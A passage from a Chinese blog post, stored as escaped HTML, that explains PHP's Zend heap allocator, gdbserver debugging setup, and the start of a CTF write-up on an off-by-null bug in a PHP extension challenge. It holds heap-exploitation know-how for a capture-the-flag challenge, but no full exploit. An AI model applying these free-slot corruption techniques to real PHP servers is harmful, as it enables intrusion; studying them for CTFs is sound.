1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;基本数据结构&#34;&gt;&lt;span&gt;基本数据结构&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e6%9c%ac%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;struct _zend_mm_heap {&#xD;&#xA;#if ZEND_MM_STAT&#xD;&#xA;    size_t             size; //当前已用内存数&#xD;&#xA;    size_t             peak; //内存单次申请的峰值&#xD;&#xA;#endif&#xD;&#xA;    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部&#xD;&#xA;    ...&#xD;&#xA;    zend_mm_huge_list *huge_list;               //大内存链表&#xD;&#xA;    zend_mm_chunk     *main_chunk;              //指向chunk链表头部&#xD;&#xA;    zend_mm_chunk     *cached_chunks;           //缓存的chunk链表&#xD;&#xA;    int                chunks_count;            //已分配chunk数&#xD;&#xA;    int                peak_chunks_count;       //当前request使用chunk峰值&#xD;&#xA;    int                cached_chunks_count;     //缓存的chunk数&#xD;&#xA;    double             avg_chunks_count;        //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count&amp;#43;peak_chunks_count)/2.0&#xD;&#xA;}&#xD;&#xA;struct _zend_mm_chunk {&#xD;&#xA;    zend_mm_heap      *heap; //指向heap&#xD;&#xA;    zend_mm_chunk     *next; //指向下一个chunk&#xD;&#xA;    zend_mm_chunk     *prev; //指向上一个chunk&#xD;&#xA;    int                free_pages; //当前chunk的剩余page数&#xD;&#xA;    int                free_tail;               /* number of free pages at the end of chunk */&#xD;&#xA;    int                num;&#xD;&#xA;    char               reserve[64 - (sizeof(void*) * 3 &amp;#43; sizeof(int) * 3)];&#xD;&#xA;    zend_mm_heap       heap_slot; //heap结构，只有主chunk会用到&#xD;&#xA;    zend_mm_page_map   free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位&#xD;&#xA;    zend_mm_page_info  map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等&#xD;&#xA;};&#xD;&#xA;//按固定大小切好的small内存槽&#xD;&#xA;struct _zend_mm_free_slot {&#xD;&#xA;    zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/zend_heap.png&#34; title=&#34;/img/phppwn/zend_heap.png&#34; data-thumbnail=&#34;/img/phppwn/zend_heap.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/zend_heap.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/zend_heap.png&#39; alt=&#34;/img/phppwn/zend_heap.png&#34;&gt;&lt;/a&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;small内存分配&#34;&gt;&lt;span&gt;small内存分配&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#small%e5%86%85%e5%ad%98%e5%88%86%e9%85%8d&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;code&gt;emalloc&lt;/code&gt;的底层函数，简化后：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size)&#xD;&#xA;{&#xD;&#xA;    void *ptr;&#xD;&#xA;&#xD;&#xA;#if ZEND_DEBUG&#xD;&#xA;    size_t real_size = size;&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;    // ---- 1. 小块分配 ----&#xD;&#xA;    if (size &amp;lt;= ZEND_MM_MAX_SMALL_SIZE) {&#xD;&#xA;        ptr = zend_mm_alloc_small(heap, size);&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    // ---- 2. 中等块分配 ----&#xD;&#xA;    else if (size &amp;lt;= ZEND_MM_MAX_LARGE_SIZE) {&#xD;&#xA;        ptr = zend_mm_alloc_large(heap, size);&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    // ---- 3. 超大块分配 ----&#xD;&#xA;    else {&#xD;&#xA;        ptr = zend_mm_alloc_huge(heap, size);&#xD;&#xA;    }&#xD;&#xA;    return ptr;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看出php申请的堆块根据大小分三种：&lt;code&gt;small&lt;/code&gt;、&lt;code&gt;large&lt;/code&gt;、&lt;code&gt;huge&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;其中&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#define ZEND_MM_MIN_SMALL_SIZE&#x9;&#x9;8&#xD;&#xA;#define ZEND_MM_MAX_SMALL_SIZE      3072&#x9;//3KB&#xD;&#xA;#define ZEND_MM_MAX_LARGE_SIZE      (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE))&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;小于&lt;code&gt;3KB&lt;/code&gt;-&amp;gt;&lt;code&gt;small&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;大于&lt;code&gt;3KB&lt;/code&gt;，小于&lt;code&gt;2044KB&lt;/code&gt;(511 page_size)，不是512个page是因为第一个page用于存储&lt;code&gt;_zend_mm_heap&lt;/code&gt;结构体&lt;/li&gt;&#xA;&lt;li&gt;大于&lt;code&gt;2MB&lt;/code&gt;-&amp;gt;&lt;code&gt;huge&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;zend_mm_alloc_small&#34;&gt;&lt;span&gt;zend_mm_alloc_small&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#zend_mm_alloc_small&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)&#xD;&#xA;{&#xD;&#xA;&#x9;ZEND_ASSERT(bin_data_size[bin_num] &amp;gt;= ZEND_MM_MIN_USEABLE_BIN_SIZE);&#xD;&#xA;&#xD;&#xA;#if ZEND_MM_STAT&#xD;&#xA;&#x9;do {&#xD;&#xA;&#x9;&#x9;size_t size = heap-&amp;gt;size &amp;#43; bin_data_size[bin_num];&#xD;&#xA;&#x9;&#x9;size_t peak = MAX(heap-&amp;gt;peak, size);&#xD;&#xA;&#x9;&#x9;heap-&amp;gt;size = size;&#xD;&#xA;&#x9;&#x9;heap-&amp;gt;peak = peak;&#xD;&#xA;&#x9;} while (0);&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;&#x9;if (EXPECTED(heap-&amp;gt;free_slot[bin_num] != NULL)) {&#xD;&#xA;&#x9;&#x9;zend_mm_free_slot *p = heap-&amp;gt;free_slot[bin_num];&#xD;&#xA;&#x9;&#x9;heap-&amp;gt;free_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p);&#xD;&#xA;&#x9;&#x9;return p;&#xD;&#xA;&#x9;} else {&#xD;&#xA;&#x9;&#x9;return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);&#xD;&#xA;&#x9;}&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;相应size的&lt;code&gt;free_slot&lt;/code&gt;中有堆块就从&lt;code&gt;free_slot&lt;/code&gt;中取第一个，并更新&lt;code&gt;free_slot&lt;/code&gt;链表头&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot)&#xD;&#xA;{&#xD;&#xA;&#x9;zend_mm_free_slot *next = slot-&amp;gt;next_free_slot;&#xD;&#xA;&#x9;if (EXPECTED(next != NULL)) {&#xD;&#xA;&#x9;&#x9;zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num);&#xD;&#xA;&#x9;&#x9;if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) {&#xD;&#xA;&#x9;&#x9;&#x9;zend_mm_panic(&amp;#34;zend_mm_heap corrupted&amp;#34;);&#xD;&#xA;&#x9;&#x9;}&#xD;&#xA;&#x9;}&#xD;&#xA;&#x9;return (zend_mm_free_slot*)next;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没有的话就执行**&lt;code&gt;zend_mm_alloc_small_slow&lt;/code&gt;**，这个函数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;向堆申请新的页&lt;/li&gt;&#xA;&lt;li&gt;将页分成多个小块，返回第一个小块&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;其他块链入相应的&lt;code&gt;slot&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;phpgdb&#34;&gt;&lt;span&gt;phpgdb&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#phpgdb&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;调试用的这位师傅写的东西：&lt;a href=&#34;https://github.com/GeekCmore/phpdbg&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;phpdbg&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里如果执行&lt;code&gt;sudo apt install php-cli-dbgsym&lt;/code&gt;报错可以：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt update&#xD;&#xA;sudo apt install ubuntu-dbgsym-keyring -y&#xD;&#xA;&#xD;&#xA;sudo tee /etc/apt/sources.list.d/ddebs.list &amp;lt;&amp;lt;&amp;#39;EOF&amp;#39;&#xD;&#xA;deb http://ddebs.ubuntu.com noble main restricted universe multiverse&#xD;&#xA;deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse&#xD;&#xA;EOF&#xD;&#xA;&#xD;&#xA;sudo apt update&#xD;&#xA;&#xD;&#xA;sudo apt install php8.3-cli-dbgsym -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种方式只能下8.3版本的符号表，如果还要其他版本的符号表：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo add-apt-repository ppa:ondrej/php -y&#xD;&#xA;sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把&lt;code&gt;Components: main&lt;/code&gt;修改成：&lt;code&gt;Components: main main/debug&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;再&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt update&#xD;&#xA;sudo apt install php8.4-cli-dbgsym&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;容器与容器之间进行调试&#34;&gt;&lt;span&gt;容器与容器之间进行调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%b9%e5%99%a8%e4%b8%8e%e5%ae%b9%e5%99%a8%e4%b9%8b%e9%97%b4%e8%bf%9b%e8%a1%8c%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;两个容器都要下载gdbserver&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;apt-get update &amp;amp;&amp;amp; apt-get install -y gdbserver&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后被连接的容器：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gdbserver :8888 --args php ./exp.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还要获取被连接容器的ip：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;hostname -i&#xD;&#xA;172.17.0.3&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后用另一个容器去连接：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gdb&#xD;&#xA;target remote 172.17.0.3:8888&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;容器与wsl2之间进行调试&#34;&gt;&lt;span&gt;容器与wsl2之间进行调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%b9%e5%99%a8%e4%b8%8ewsl2%e4%b9%8b%e9%97%b4%e8%bf%9b%e8%a1%8c%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;如果用wsl2去远程调试容器里的程序，wsl2里：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gdb&#xD;&#xA;target remote localhost:7777&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;通过&lt;code&gt;localhost&lt;/code&gt;连接需要容器映射端口到本地（参数&lt;code&gt;-p&lt;/code&gt;）：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ docker run -it \                           &#xD;&#xA;-p 9999:9999 \&#xD;&#xA;-p 7777:7777 \&#xD;&#xA;--name d3ctf_hackphp \&#xD;&#xA;d3ctf_hackphp&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;code&gt;phpgdb&lt;/code&gt;支持四个命令：&lt;code&gt;pheap&lt;/code&gt; &lt;code&gt;psmall&lt;/code&gt; &lt;code&gt;pelement&lt;/code&gt; &lt;code&gt;pstart&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;p alloc_globals.mm_heap&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;例题&#34;&gt;&lt;span&gt;例题&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%be%8b%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;堆off-by-nullpwnshell&#34;&gt;&lt;span&gt;堆off by null：PwnShell&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%a0%86off-by-nullpwnshell&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;堆菜单题&lt;/p&gt;&#xA;&lt;p&gt;addHacker：参数是两个str，申请两个堆块，结构如下&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//堆结构&#xD;&#xA;chunkList[idx] → heap2&#xD;&#xA;                 ┌──────────────────────────┐&#xD;&#xA;                 │ [0] = pointer to heap1   │&#xD;&#xA;                 │ [1] = len_string_1       │&#xD;&#xA;                 │ [2] ← string_2           │ &amp;lt;- off-by-null&#xD;&#xA;                 └──────────────────────────┘&#xD;&#xA;                             ↑&#xD;&#xA;                             │&#xD;&#xA;                             │&#xD;&#xA;                 ┌──────────────────────────┐&#xD;&#xA;                 │ heap1                    │&#xD;&#xA;                 │ [data] ← valu_1-&amp;gt;val&amp;#43;4   │&#xD;&#xA;                 └──────────────────────────┘&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;removeHacker：参数为lval，&lt;code&gt;efree&lt;/code&gt;掉相应chunklist中的堆块&lt;/p&gt;&#xA;&lt;p&gt;editHacker：参数一个lval，一个str。如果要写入的数据比原先heap1的少，就用原先的heap；否则free掉原来的heap1，申请一个堆块放数据&lt;/p&gt;&#xA;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add($a, $b){&#xD;&#xA;    addHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;function rm($a){&#xD;&#xA;    removeHacker($a);&#xD;&#xA;}&#xD;&#xA;function edit($a, $b){&#xD;&#xA;    editHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;add(&amp;#34;abcdefghk&amp;#34;, &amp;#34;bbbbbbb&amp;#34;);&#xD;&#xA;edit(0,&amp;#34;aaaaaa&amp;#34;);&#xD;&#xA;rm(0);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：&lt;/p&gt;&#xA;&lt;p&gt;主要漏洞在&lt;code&gt;addHacker&lt;/code&gt;中，存在&lt;code&gt;off-by-null&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; *((_BYTE *)heap2 &amp;#43; len_2 &amp;#43; 16) = 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以利用这个漏洞修改0x18大小的slot链表&lt;/p&gt;&#xA;&lt;p&gt;修改前：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/pwnshell_1.png&#34; title=&#34;/img/phppwn/pwnshell_1.png&#34; data-thumbnail=&#34;/img/phppwn/pwnshell_1.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/pwnshell_1.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/pwnshell_1.png&#39; alt=&#34;/img/phppwn/pwnshell_1.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;修改后：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/pwnshell_2.png&#34; title=&#34;/img/phppwn/pwnshell_2.png&#34; data-thumbnail=&#34;/img/phppwn/pwnshell_2.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/pwnshell_2.png&lt;/h2&gt;&#34;&gt;&lt;img 